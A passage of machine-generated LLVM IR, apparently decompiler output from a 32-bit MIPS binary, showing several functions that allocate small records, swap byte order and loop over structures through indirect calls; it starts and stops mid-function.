  %v1_40081c = load i32, i32* %s6.global-to-local, align 4
  %v2_40081c = icmp slt i32 %.01, %v1_40081c
  %v3_40081c = zext i1 %v2_40081c to i32
  store i32 %v3_40081c, i32* %v0.global-to-local, align 4
  %v1_400820 = add i32 %.01, 1
  store i32 %v1_400820, i32* %a0.global-to-local, align 4
  %v3_400828 = load i32, i32* @global_var_4493f0.14, align 4
  store i32 %v3_400828, i32* %t9.global-to-local, align 4
  store i32 4, i32* %a1.global-to-local, align 4
  %v0_400830 = load i32, i32* %s2.global-to-local, align 4
  %v1_400830 = add i32 %v0_400830, 2
  store i32 %v1_400830, i32* @fp, align 4
  %v1_400838 = icmp eq i1 %v2_40081c, false
  %v3_400838 = add i32 %v2_400810, -1
  store i32 %v3_400838, i32* %v1.global-to-local, align 4
  br i1 %v1_400838, label %dec_label_pc_40083c, label %dec_label_pc_4007e4.dec_label_pc_400770_crit_edge

dec_label_pc_4007e4.dec_label_pc_400770_crit_edge: ; preds = %dec_label_pc_4007e4
  %v1_400818 = add i32 %v2_400810, -2
  %v2_400770.pre = load i32, i32* %s5.global-to-local, align 4
  br label %dec_label_pc_400770

dec_label_pc_40083c:                              ; preds = %dec_label_pc_4007e4
  %v3_400844 = load i32, i32* @global_var_449338.22, align 4
  store i32 %v3_400844, i32* %t9.global-to-local, align 4
  %v1_40084c = mul i32 %.14, 256
  %v1_40085c = and i32 %v1_40084c, 16711680
  store i32 %v1_40085c, i32* %v1.global-to-local, align 4
  store i32 %.1, i32* %v0.global-to-local, align 4
  %v2_400874 = call i32 @llvm.bswap.i32(i32 %.14)
  store i32 %v2_400874, i32* %a0.global-to-local, align 4
  %v0_400878 = load i32, i32* @s7, align 4
  store i32 %v0_400878, i32* %a2.global-to-local, align 4
  %v0_40087c = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_40087c, i32* %a3.global-to-local, align 4
  %v2_400880 = urem i32 %.1, 256
  store i32 %v2_400880, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400844)
  store i32 %v0_400640, i32* %s6.global-to-local, align 4
  store i32 %v0_400644, i32* %s5.global-to-local, align 4
  store i32 %v0_400648, i32* %s4.global-to-local, align 4
  store i32 %v0_40064c, i32* %s3.global-to-local, align 4
  store i32 %v0_400650, i32* %s2.global-to-local, align 4
  store i32 %v0_400654, i32* %s1.global-to-local, align 4
  store i32 %v0_400658, i32* %s0.global-to-local, align 4
  ret i32 %.1

; uselistorder directives
  uselistorder i32 %v0_400830, { 1, 0 }
  uselistorder i32 %v1_400820, { 1, 0 }
  uselistorder i32 %v2_400810, { 2, 0, 3, 1 }
  uselistorder i32 %.0, { 2, 1, 0 }
  uselistorder i32 %v1_400728, { 1, 2, 0 }
  uselistorder i32 %v4_40071c, { 1, 0 }
  uselistorder i32 %v0_4006f0, { 1, 0 }
  uselistorder i32 %.1, { 2, 0, 1 }
  uselistorder i32 %.14, { 1, 0 }
  uselistorder i32 %v3_400698, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_400680, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_400670, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_400658, { 1, 2, 0 }
  uselistorder i32 %v0_40063c, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %v1.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* %v0.global-to-local, { 15, 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 13, 10, 11, 12, 14 }
  uselistorder i32* %t9.global-to-local, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %s6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %s5.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %s4.global-to-local, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32* %s3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %s2.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32* %s0.global-to-local, { 0, 2, 1, 3, 5, 6, 4, 7, 8, 9 }
  uselistorder i32* %a3.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %a2.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* %a1.global-to-local, { 10, 1, 2, 3, 4, 5, 6, 8, 7, 9, 0 }
  uselistorder i32* %a0.global-to-local, { 16, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg2, { 3, 2, 4, 1, 0, 5 }
  uselistorder label %dec_label_pc_4007e4, { 1, 0 }
  uselistorder label %dec_label_pc_4007a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_400740, { 1, 0 }
  uselistorder label %dec_label_pc_4006c0, { 1, 0 }
}

define i32 @function_4008bc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4008bc:
  %v1.global-to-local = alloca i32, align 4
  %v0_4008d0 = load i32, i32* @s1, align 4
  %v0_4008d4 = load i32, i32* @s0, align 4
  %v3_4008dc = load i32, i32* @global_var_449458.24, align 4
  store i32 %v3_4008dc, i32* @t9, align 4
  %v1_4008e0 = urem i32 %arg1, 256
  store i32 %v1_4008e0, i32* @s0, align 4
  store i32 %arg2, i32* @s1, align 4
  %v3_4008e8 = call i32 @function_405dd0(i32 12)
  %v0_4008f4 = load i32, i32* @s0, align 4
  %v1_4008f4 = trunc i32 %v0_4008f4 to i8
  %v3_4008f4 = add i32 %v3_4008e8, 4
  %v4_4008f4 = inttoptr i32 %v3_4008f4 to i8*
  store i8 %v1_4008f4, i8* %v4_4008f4, align 1
  %v0_4008fc = load i32, i32* @s1, align 4
  %v2_4008fc = inttoptr i32 %v3_4008e8 to i32*
  store i32 %v0_4008fc, i32* %v2_4008fc, align 4
  %v3_400900 = load i32, i32* @global_var_449504.25, align 4
  store i32 %v3_400900, i32* %v1.global-to-local, align 4
  %v1_400904 = add i32 %v3_4008e8, 8
  %v2_400904 = inttoptr i32 %v1_400904 to i32*
  store i32 0, i32* %v2_400904, align 4
  %v1_400908 = load i32, i32* %v1.global-to-local, align 4
  %v2_400908 = add i32 %v1_400908, 8
  %v3_400908 = inttoptr i32 %v2_400908 to i32*
  store i32 %v3_4008e8, i32* %v3_400908, align 4
  store i32 %v3_4008e8, i32* @global_var_449504.25, align 4
  store i32 %v0_4008d0, i32* @s1, align 4
  store i32 %v0_4008d4, i32* @s0, align 4
  ret i32 %v3_4008e8
}

define i32 @function_400924() local_unnamed_addr {
dec_label_pc_400924:
  %v3_40093c = load i32, i32* @global_var_449458.24, align 4
  store i32 %v3_40093c, i32* @t9, align 4
  %v2_400944 = call i32 @function_405dd0(i32 12)
  store i32 %v2_400944, i32* @global_var_449504.25, align 4
  store i32 %v2_400944, i32* @global_var_449500.11, align 4
  %v1_40096c = add i32 %v2_400944, 4
  %v2_40096c = inttoptr i32 %v1_40096c to i8*
  store i8 0, i8* %v2_40096c, align 1
  %v1_400970 = add i32 %v2_400944, 8
  %v2_400970 = inttoptr i32 %v1_400970 to i32*
  store i32 0, i32* %v2_400970, align 4
  ret i32 %v2_400944

; uselistorder directives
  uselistorder i32 %v2_400944, { 0, 1, 3, 2, 4 }
}

define i32 @function_400984() local_unnamed_addr {
dec_label_pc_400984:
  %a0.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %s6.global-to-local = alloca i32, align 4
  %t9.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_400994 = load i32, i32* @ra, align 4
  %v3_40099c = load i32, i32* @global_var_4492a8.26, align 4
  store i32 %v3_40099c, i32* @t9, align 4
  %v1_4009a4 = call i32 @function_400924()
  store i32 %v1_4009a4, i32* %v0.global-to-local, align 4
  store i32 %v0_400994, i32* @ra, align 4
  %v3_4009b4 = load i32, i32* @global_var_4493d8.27, align 4
  store i32 %v3_4009b4, i32* @t9, align 4
  %v3_4009b8 = load i32, i32* bitcast (i32** @global_var_449354.29 to i32*), align 4
  store i32 1, i32* %a0.global-to-local, align 4
  %v6_4009c0 = call i32 @function_4008bc(i32 1, i32 %v3_4009b8)
  store i32 %v6_4009c0, i32* %v0.global-to-local, align 4
  %v1_4009d0 = load i32, i32* @t9, align 4
  %v0_4009f4 = load i32, i32* @s2, align 4
  store i32 %v0_4009f4, i32* %stack_var_-32, align 4
  %v0_4009f8 = load i32, i32* @s1, align 4
  %v1_400a04 = add i32 %v1_4009d0, 297512
  %v2_400a04 = inttoptr i32 %v1_400a04 to i32*
  %v3_400a04 = load i32, i32* %v2_400a04, align 4
  store i32 %v3_400a04, i32* %t9.global-to-local, align 4
  store i32 1, i32* %s6.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  %v0_400a18 = load i32, i32* @a3, align 4
  store i32 %v0_400a18, i32* %s1.global-to-local, align 4
  %v1_400a1c = load i32, i32* @a2, align 4
  %v2_400a1c = urem i32 %v1_400a1c, 256
  store i32 %v2_400a1c, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400a04)
  %v0_400a28 = load i32, i32* %s6.global-to-local, align 4
  store i32 %v0_400a28, i32* %a0.global-to-local, align 4
  %v3_400a2c = load i32, i32* @global_var_4492e4, align 4
  store i32 %v3_400a2c, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400a2c)
  %v0_400a40 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_400a40, i32* %a0.global-to-local, align 4
  %v3_400a44 = load i32, i32* bitcast (i32** @global_var_4492e8.34 to i32*), align 4
  store i32 %v3_400a44, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400a44)
  store i32 %v0_400a40, i32* %a0.global-to-local, align 4
  %v3_400a64 = load i32, i32* bitcast (i32** @global_var_4492e8.34 to i32*), align 4
  store i32 %v3_400a64, i32* %t9.global-to-local, align 4
  %v2_400a74 = urem i32 %v6_4009c0, 65536
  store i32 %v2_400a74, i32* %s5.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400a64)
  %v0_400a80 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_400a80, i32* %a0.global-to-local, align 4
  %v3_400a84 = load i32, i32* bitcast (i32** @global_var_4492e8.34 to i32*), align 4
  store i32 %v3_400a84, i32* %t9.global-to-local, align 4
  store i32 %v2_400a74, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400a84)
  store i32 %v0_400a80, i32* %a0.global-to-local, align 4
  %v3_400aa4 = load i32, i32* bitcast (i32** @global_var_4492e8.34 to i32*), align 4
  store i32 %v3_400aa4, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400aa4)
  %v1_400abc = mul i32 %v6_4009c0, 16777216
  %v1_400ac0 = sdiv i32 %v1_400abc, 16777216
  store i32 %v6_4009c0, i32* %s4.global-to-local, align 4
  store i32 %v6_4009c0, i32* %s3.global-to-local, align 4
  %v0_400ad8 = load i32, i32* %s2.global-to-local, align 4
  %v2_400ad8 = icmp eq i32 %v0_400ad8, 65535
  %v4_400ad8 = urem i32 %v0_400ad8, 256
  store i32 %v4_400ad8, i32* %v0.global-to-local, align 4
  br i1 %v2_400ad8, label %dec_label_pc_400adc, label %dec_label_pc_400afc

dec_label_pc_400adc:                              ; preds = %dec_label_pc_400984
  %v1_400ae0 = add i32 %v1_4009d0, 297548
  %v2_400ae0 = inttoptr i32 %v1_400ae0 to i32*
  %v3_400ae0 = load i32, i32* %v2_400ae0, align 4
  store i32 %v3_400ae0, i32* %t9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400ae0)
  %v0_400af8 = load i32, i32* %v0.global-to-local, align 4
  %v0_400b00.pre = load i32, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_400afc

dec_label_pc_400afc:                              ; preds = %dec_label_pc_400984, %dec_label_pc_400adc
  %v0_400b00 = phi i32 [ %v0_400ad8, %dec_label_pc_400984 ], [ %v0_400b00.pre, %dec_label_pc_400adc ]
  %v0_400afc = phi i32 [ %v4_400ad8, %dec_label_pc_400984 ], [ %v0_400af8, %dec_label_pc_400adc ]
  %v1_400afc = mul i32 %v0_400afc, 256
  store i32 %v1_400afc, i32* %v0.global-to-local, align 4
  %v1_400b00 = udiv i32 %v0_400b00, 256
  store i32 %v1_400b00, i32* %v1.global-to-local, align 4
  store i32 %v3_4009b8, i32* %s1.global-to-local, align 4
  store i32 0, i32* %s2.global-to-local, align 4
  %v0_400b14.pre = load i32, i32* %t9.global-to-local, align 4
  br label %dec_label_pc_400b14

dec_label_pc_400b14:                              ; preds = %dec_label_pc_400c2c, %dec_label_pc_400afc
  %v0_400b14 = phi i32 [ %v3_400c50, %dec_label_pc_400c2c ], [ %v0_400b14.pre, %dec_label_pc_400afc ]
  call void @__pseudo_call(i32 %v0_400b14)
  %v0_400b20 = load i32, i32* %s5.global-to-local, align 4
  %v1_400b20 = mul i32 %v0_400b20, 256
  %v1_400b24 = and i32 %v1_400b20, 65280
  store i32 %v1_400b24, i32* %v1.global-to-local, align 4
  %v1_400b28 = udiv i32 %v0_400b20, 256
  store i32 %v1_400b28, i32* %a0.global-to-local, align 4
  %v0_400b2c = load i32, i32* %v0.global-to-local, align 4
  %v1_400b2c = load i32, i32* %s4.global-to-local, align 4
  %v2_400b2c = inttoptr i32 %v1_400b2c to i32*
  store i32 %v0_400b2c, i32* %v2_400b2c, align 4
  store i32 65535, i32* %v0.global-to-local, align 4
  %v3_400b34 = load i32, i32* @global_var_449308, align 4
  store i32 %v3_400b34, i32* %t9.global-to-local, align 4
  %v0_400b38 = load i32, i32* %s5.global-to-local, align 4
  %v2_400b38 = icmp eq i32 %v0_400b38, 65535
  %v3_400b38 = load i32, i32* %a0.global-to-local, align 4
  %v4_400b38 = load i32, i32* %v1.global-to-local, align 4
  %v5_400b38 = or i32 %v4_400b38, %v3_400b38
  store i32 %v5_400b38, i32* %a0.global-to-local, align 4
  %extract.t = trunc i32 %v5_400b38 to i16
  br i1 %v2_400b38, label %dec_label_pc_400b3c, label %dec_label_pc_400b54

dec_label_pc_400b3c:                              ; preds = %dec_label_pc_400b14
  call void @__pseudo_call(i32 %v3_400b34)
  %v0_400b50 = load i32, i32* %v0.global-to-local, align 4
  %v1_400b50 = trunc i32 %v0_400b50 to i16
  %v2_400b50 = load i32, i32* %s1.global-to-local, align 4
  %v3_400b50 = add i32 %v2_400b50, 2
  %v4_400b50 = inttoptr i32 %v3_400b50 to i16*
  store i16 %v1_400b50, i16* %v4_400b50, align 2
  %v0_400b54.pre = load i32, i32* %a0.global-to-local, align 4
  %extract.t14 = trunc i32 %v0_400b54.pre to i16
  br label %dec_label_pc_400b54

dec_label_pc_400b54:                              ; preds = %dec_label_pc_400b14, %dec_label_pc_400b3c
  %v0_400b54.off0 = phi i16 [ %extract.t, %dec_label_pc_400b14 ], [ %extract.t14, %dec_label_pc_400b3c ]
  %v2_400b54 = load i32, i32* %s1.global-to-local, align 4
  %v3_400b54 = add i32 %v2_400b54, 2
  %v4_400b54 = inttoptr i32 %v3_400b54 to i16*
  store i16 %v0_400b54.off0, i16* %v4_400b54, align 2
  %v3_400b58 = load i32, i32* @global_var_449338.22, align 4
  store i32 %v3_400b58, i32* %t9.global-to-local, align 4
  store i32 2, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400b58)
  store i32 -1, i32* %v1.global-to-local, align 4
  %v3_400b74 = load i32, i32* @global_var_4492d0.45, align 4
  store i32 %v3_400b74, i32* %t9.global-to-local, align 4
  %v0_400b78 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_400b78, i32* %a0.global-to-local, align 4
  %v0_400b84 = load i32, i32* %s2.global-to-local, align 4
  %v1_400b84 = add i32 %v0_400b84, 1
  store i32 %v1_400b84, i32* %s2.global-to-local, align 4
  %v0_400b88 = load i32, i32* %s4.global-to-local, align 4
  %v1_400b88 = add i32 %v0_400b88, 4
  store i32 %v1_400b88, i32* %s4.global-to-local, align 4
  %v2_400b8c = icmp eq i32 %v0_400b78, -1
  %v4_400b8c = load i32, i32* %s3.global-to-local, align 4
  %v5_400b8c = inttoptr i32 %v4_400b8c to i32*
  store i32 %v0_400b78, i32* %v5_400b8c, align 4
  br i1 %v2_400b8c, label %dec_label_pc_400cd4.loopexit, label %dec_label_pc_400b90

dec_label_pc_400b90:                              ; preds = %dec_label_pc_400b54
  store i32 2, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400b74)
  %v0_400ba8 = load i32, i32* %s1.global-to-local, align 4
  %v1_400ba8 = add i32 %v0_400ba8, 20
  %v2_400ba8 = inttoptr i32 %v1_400ba8 to i8*
  %v3_400ba8 = load i8, i8* %v2_400ba8, align 1
  %v1_400bb0 = icmp ult i8 %v3_400ba8, 32
  %v2_400bb0 = zext i1 %v1_400bb0 to i32
  store i32 %v2_400bb0, i32* %v0.global-to-local, align 4
  %v3_400bb4 = load i32, i32* @global_var_449308, align 4
  store i32 %v3_400bb4, i32* %t9.global-to-local, align 4
  %v1_400bb8 = icmp eq i1 %v1_400bb0, false
  br i1 %v1_400bb8, label %dec_label_pc_400c2c, label %dec_label_pc_400bbc

dec_label_pc_400bbc:                              ; preds = %dec_label_pc_400b90
  %v1_400bc0 = add i32 %v0_400ba8, 16
  %v2_400bc0 = inttoptr i32 %v1_400bc0 to i32*
  %v3_400bc0 = load i32, i32* %v2_400bc0, align 4
  store i32 %v3_400bc0, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400bb4)
  %v2_400bd0 = udiv i32 %v3_400bc0, 256
  %v1_400bd8 = and i32 %v2_400bd0, 65280
  store i32 %v1_400bd8, i32* %a0.global-to-local, align 4
  %v1_400bdc = udiv i32 %v3_400bc0, 16777216
  store i32 %v1_400bdc, i32* %v1.global-to-local, align 4
  %v1_400bd4 = mul i32 %v3_400bc0, 256
  %v1_400be0 = and i32 %v1_400bd4, 16711680
  %v0_400be4 = load i32, i32* %s1.global-to-local, align 4
  %v1_400be4 = add i32 %v0_400be4, 20
  %v2_400be4 = inttoptr i32 %v1_400be4 to i8*
  %v3_400be4 = load i8, i8* %v2_400be4, align 1
  %v4_400be4 = zext i8 %v3_400be4 to i32
  %v1_400be8 = mul i32 %v3_400bc0, 16777216
  %v2_400bf0 = or i32 %v1_400be0, %v1_400be8
  store i32 %v2_400bf0, i32* %s0.global-to-local, align 4
  %v0_400bf4 = load i32, i32* %v0.global-to-local, align 4
  %v2_400bf4 = lshr i32 %v0_400bf4, %v4_400be4
  %v2_400bf8 = call i32 @llvm.bswap.i32(i32 %v3_400bc0)
  %v2_400bfc = add i32 %v2_400bf4, %v2_400bf8
  %v1_400c04 = mul i32 %v2_400bfc, 256
  %v1_400c10 = and i32 %v1_400c04, 16711680
  store i32 %v1_400c10, i32* %a0.global-to-local, align 4
  %v1_400c14 = mul i32 %v2_400bfc, 16777216
  %v2_400c1c = or i32 %v1_400c10, %v1_400c14
  store i32 %v2_400c1c, i32* %v1.global-to-local, align 4
  %v2_400c20 = call i32 @llvm.bswap.i32(i32 %v2_400bfc)
  store i32 %v2_400c20, i32* %v0.global-to-local, align 4
  %v2_400c28 = add i32 %v0_400be4, 4
  %v3_400c28 = inttoptr i32 %v2_400c28 to i32*
  store i32 %v2_400c20, i32* %v3_400c28, align 4
  br label %dec_label_pc_400c2c

dec_label_pc_400c2c:                              ; preds = %dec_label_pc_400b90, %dec_label_pc_400bbc
  %v3_400c2c = load i32, i32* @global_var_44939c.48, align 4
  store i32 %v3_400c2c, i32* %t9.global-to-local, align 4
  %v0_400c30 = load i32, i32* %s3.global-to-local, align 4
  %v1_400c30 = inttoptr i32 %v0_400c30 to i32*
  %v2_400c30 = load i32, i32* %v1_400c30, align 4
  store i32 %v2_400c30, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400c2c)
  %v1_400c44 = add i32 %v0_400c30, 4
  store i32 %v1_400c44, i32* %s3.global-to-local, align 4
  %v0_400c48 = load i32, i32* %s1.global-to-local, align 4
  %v1_400c48 = add i32 %v0_400c48, 24
  store i32 %v1_400c48, i32* %s1.global-to-local, align 4
  %v0_400c4c = load i32, i32* %s2.global-to-local, align 4
  %v1_400c4c = load i32, i32* %s6.global-to-local, align 4
  %v2_400c4c = icmp slt i32 %v0_400c4c, %v1_400c4c
  %v3_400c4c = zext i1 %v2_400c4c to i32
  store i32 %v3_400c4c, i32* %v0.global-to-local, align 4
  %v3_400c50 = load i32, i32* @global_var_4492e4, align 4
  store i32 %v3_400c50, i32* %t9.global-to-local, align 4
  store i32 65535, i32* %a0.global-to-local, align 4
  br i1 %v2_400c4c, label %dec_label_pc_400b14, label %dec_label_pc_400c5c

dec_label_pc_400c5c:                              ; preds = %dec_label_pc_400c2c
  store i32 0, i32* %s2.global-to-local, align 4
  store i32 0, i32* %s1.global-to-local, align 4
  %v1_400abc.off = or i32 %v1_400abc, 16777215
  %tmp = icmp ult i32 %v1_400abc.off, 33554431
  %v1_400c8c = add i32 %v1_4009d0, 297560
  %v2_400c8c = inttoptr i32 %v1_400c8c to i32*
  br label %dec_label_pc_400c6c

dec_label_pc_400c6c:                              ; preds = %dec_label_pc_400c88, %dec_label_pc_400c5c
  %v1_400c9010 = phi i32 [ %v1_400cac, %dec_label_pc_400c88 ], [ 0, %dec_label_pc_400c5c ]
  %v0_400c7c = phi i32 [ %v3_400cb8, %dec_label_pc_400c88 ], [ %v3_400c50, %dec_label_pc_400c5c ]
  %v0_400c70 = phi i32 [ %v2_400cc0, %dec_label_pc_400c88 ], [ 65535, %dec_label_pc_400c5c ]
  store i32 %v1_400ac0, i32* %v0.global-to-local, align 4
  %v1_400c70 = inttoptr i32 %v0_400c70 to i32*
  %v2_400c70 = load i32, i32* %v1_400c70, align 4
  store i32 %v2_400c70, i32* %s0.global-to-local, align 4
  br i1 %tmp, label %dec_label_pc_400c88, label %dec_label_pc_400c78

dec_label_pc_400c78:                              ; preds = %dec_label_pc_400c6c
  store i32 %v2_400c70, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_400c7c)
  %v1_400c90.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_400c88

dec_label_pc_400c88:                              ; preds = %dec_label_pc_400c6c, %dec_label_pc_400c78
  %v1_400c90 = phi i32 [ %v1_400c9010, %dec_label_pc_400c6c ], [ %v1_400c90.pre, %dec_label_pc_400c78 ]
  store i32 %v6_4009c0, i32* %v1.global-to-local, align 4
  %v3_400c8c = load i32, i32* %v2_400c8c, align 4
  store i32 %v3_400c8c, i32* %t9.global-to-local, align 4
  %v2_400c90 = add i32 %v1_400c90, %v6_4009c0
  store i32 %v2_400c90, i32* %v0.global-to-local, align 4
  %v1_400c94 = inttoptr i32 %v2_400c90 to i32*
  %v2_400c94 = load i32, i32* %v1_400c94, align 4
  store i32 %v2_400c94, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_400c8c)
  %v0_400cac = load i32, i32* %s1.global-to-local, align 4
  %v1_400cac = add i32 %v0_400cac, 4
  store i32 %v1_400cac, i32* %s1.global-to-local, align 4
  store i32 %v6_4009c0, i32* %v1.global-to-local, align 4
  %v0_400cb4 = load i32, i32* %s2.global-to-local, align 4
  %v1_400cb4 = load i32, i32* %s6.global-to-local, align 4
  %v2_400cb4 = icmp slt i32 %v0_400cb4, %v1_400cb4
  %v3_400cb4 = zext i1 %v2_400cb4 to i32
  store i32 %v3_400cb4, i32* %v0.global-to-local, align 4
  %v3_400cb8 = load i32, i32* @global_var_449300.51, align 4
  store i32 %v3_400cb8, i32* %t9.global-to-local, align 4
  %v1_400cbc = add i32 %v0_400cb4, 1
  store i32 %v1_400cbc, i32* %s2.global-to-local, align 4
  %v2_400cc0 = add i32 %v1_400cac, %v6_4009c0
  store i32 %v2_400cc0, i32* %a0.global-to-local, align 4
  %v1_400cc4 = icmp eq i1 %v2_400cb4, false
  br i1 %v1_400cc4, label %dec_label_pc_400cc8, label %dec_label_pc_400c6c

dec_label_pc_400cc8:                              ; preds = %dec_label_pc_400c88
  store i32 0, i32* %s2.global-to-local, align 4
  br label %dec_label_pc_400cd4

dec_label_pc_400cd4.loopexit:                     ; preds = %dec_label_pc_400b54
  %v4_400cfc.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_400cd4

dec_label_pc_400cd4:                              ; preds = %dec_label_pc_400cd4.loopexit, %dec_label_pc_400cc8
  %v4_400cfc = phi i32 [ %v4_400cfc.pre, %dec_label_pc_400cd4.loopexit ], [ 0, %dec_label_pc_400cc8 ]
  %v3_400cf0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_400cf0, i32* %s2.global-to-local, align 4
  store i32 %v0_4009f8, i32* %s1.global-to-local, align 4
  ret i32 %v4_400cfc

; uselistorder directives
  uselistorder i32 %v2_400cc0, { 1, 0 }
  uselistorder i32 %v3_400cb8, { 1, 0 }
  uselistorder i32 %v1_400cac, { 0, 2, 1 }
  uselistorder i32 %v3_400c50, { 0, 2, 1 }
  uselistorder i32 %v2_400c20, { 1, 0 }
  uselistorder i32 %v2_400bfc, { 2, 0, 1 }
  uselistorder i32 %v3_400bc0, { 0, 4, 3, 2, 1, 5 }
  uselistorder i32 %v0_400b78, { 1, 0, 2 }
  uselistorder i32 %v0_400b20, { 1, 0 }
  uselistorder i32 %v4_400ad8, { 1, 0 }
  uselistorder i32 %v0_400ad8, { 1, 0, 2 }
  uselistorder i32 %v2_400a74, { 1, 0 }
  uselistorder i32 %v1_4009d0, { 1, 0, 2 }
  uselistorder i32 %v6_4009c0, { 2, 4, 3, 5, 6, 7, 0, 1, 8 }
  uselistorder i32* %v0.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %t9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %s1.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_400c88, { 1, 0 }
  uselistorder label %dec_label_pc_400c2c, { 1, 0 }
  uselistorder label %dec_label_pc_400b54, { 1, 0 }
  uselistorder label %dec_label_pc_400afc, { 1, 0 }
}

define i32 @function_400d04(i32 %arg1) local_unnamed_addr {
dec_label_pc_400d04:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v3_400d10 = load i32, i32* bitcast (i32** @global_var_4492cc.54 to i32*), align 4
  store i32 %v3_400d10, i32* %v0.global-to-local, align 4
  store i32 %v3_400d10, i32* %a1.global-to-local, align 4
  %v1_400d20 = urem i32 %arg1, 256
  store i32 %v1_400d20, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_400d24

dec_label_pc_400d24:                              ; preds = %dec_label_pc_400e30, %dec_label_pc_400d04
  %v0_400d3c = phi i32 [ %v3_400e30, %dec_label_pc_400e30 ], [ %v3_400d10, %dec_label_pc_400d04 ]
  %v1_400d24 = inttoptr i32 %v0_400d3c to i32*
  %v2_400d24 = load i32, i32* %v1_400d24, align 4
  store i32 %v2_400d24, i32* %v0.global-to-local, align 4
  %v1_400d2c = icmp sgt i32 %v2_400d24, 0
  %v2_400d34 = icmp eq i32 %v1_400d20, %v2_400d24
  %or.cond = and i1 %v1_400d2c, %v2_400d34
  br i1 %or.cond, label %dec_label_pc_400d38, label %dec_label_pc_400e30

dec_label_pc_400d38:                              ; preds = %dec_label_pc_400d24
  %v1_400d3c = add i32 %v0_400d3c, 10
  %v2_400d3c = inttoptr i32 %v1_400d3c to i8*
  %v3_400d3c = load i8, i8* %v2_400d3c, align 1
  %v4_400d3c = sext i8 %v3_400d3c to i32
  store i32 %v4_400d3c, i32* %v0.global-to-local, align 4
  %v1_400d44 = icmp eq i8 %v3_400d3c, 0
  store i32 0, i32* %a0.global-to-local, align 4
  br i1 %v1_400d44, label %dec_label_pc_400e44, label %dec_label_pc_400d48

dec_label_pc_400d48:                              ; preds = %dec_label_pc_400d38
  store i32 -19, i32* %t0.global-to-local, align 4
  store i32 -22, i32* @a3, align 4
  store i32 -34, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_400d5c

dec_label_pc_400d5c:                              ; preds = %dec_label_pc_400d5c.dec_label_pc_400d5c_crit_edge, %dec_label_pc_400d48
  %v1_400d70 = phi i32 [ %v1_400d70.pre, %dec_label_pc_400d5c.dec_label_pc_400d5c_crit_edge ], [ -19, %dec_label_pc_400d48 ]
  %v0_400d64 = phi i32 [ %v0_400dd4, %dec_label_pc_400d5c.dec_label_pc_400d5c_crit_edge ], [ 0, %dec_label_pc_400d48 ]
  %v0_400d5c = phi i32 [ %v0_400dcc, %dec_label_pc_400d5c.dec_label_pc_400d5c_crit_edge ], [ %v0_400d3c, %dec_label_pc_400d48 ]
  %v1_400d5c = add i32 %v0_400d5c, 4
  %v2_400d5c = inttoptr i32 %v1_400d5c to i32*
  %v3_400d5c = load i32, i32* %v2_400d5c, align 4
  %v2_400d64 = add i32 %v3_400d5c, %v0_400d64
  %v1_400d68 = inttoptr i32 %v2_400d64 to i8*
  %v2_400d68 = load i8, i8* %v1_400d68, align 1
